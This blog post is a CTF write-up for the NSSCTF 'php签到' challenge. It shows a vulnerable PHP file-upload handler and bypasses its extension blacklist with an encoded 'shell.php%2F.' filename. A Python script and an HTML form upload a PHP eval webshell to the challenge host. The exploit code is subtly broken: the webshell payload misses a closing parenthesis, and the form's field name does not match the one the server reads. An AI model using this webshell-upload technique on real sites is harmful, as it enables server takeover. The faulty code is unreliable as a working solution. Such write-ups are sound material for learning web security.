---
layout: post
title: NSSCTF 2周年
categories: [blog ]
tags: [CTF,]
description: "NSSCTF2周年比赛"
image:
  feature: windows.jpg
  credit: Azeril
  creditlink: azeril.com
 

---

# NSSCTF 2周年

## php签到

```php
<?php

function waf($filename){
    $black_list = array("ph", "htaccess", "ini");
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    foreach ($black_list as $value) {
        if (stristr($ext, $value)){
            return false;
        }
    }
    return true;
}

if(isset($_FILES['file'])){//
    $filename = urldecode($_FILES['file']['name']);
    $content = file_get_contents($_FILES['file']['tmp_name']);
    if(waf($filename)){
        file_put_contents($filename, $content);
    } else {
        echo "Please re-upload";
    }
} else{
    highlight_file(__FILE__);
}
```

简单分析，可控的是上传文件的名称和内容。

流程就是，把上传文件的内容，然后输入到上传文件文件名里面，但是文件名解码了一次，并且限制了后缀 ph和二个配置文件。

所以思路就是绕过黑名单，PATHINFO只会找最后一个.后面的名字，比如

这里绕过是用了`/.`记得编码也就是`%2F.`这样`shell.php/.意思也是当前目录的shell.php

![](/img/Two/1.png)

解题方式：

1. 通过python脚本上传
2. 通过html前端（然后抓包上传）

```python
import requests
url="http://127.0.0.1/831.php"
shell="<?php eval($_POST['shell'];?>"
file={
    'file': ('shell.php%2F.',shell,'image/jpeg')
}
res=requests.post(url=url,files=file)
print(res.text)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://127.0.0.1/831.php" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br><!--name要根据题目的源码来调节-->
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

![](/img/Two/2.png)

![](/img/Two/3.png)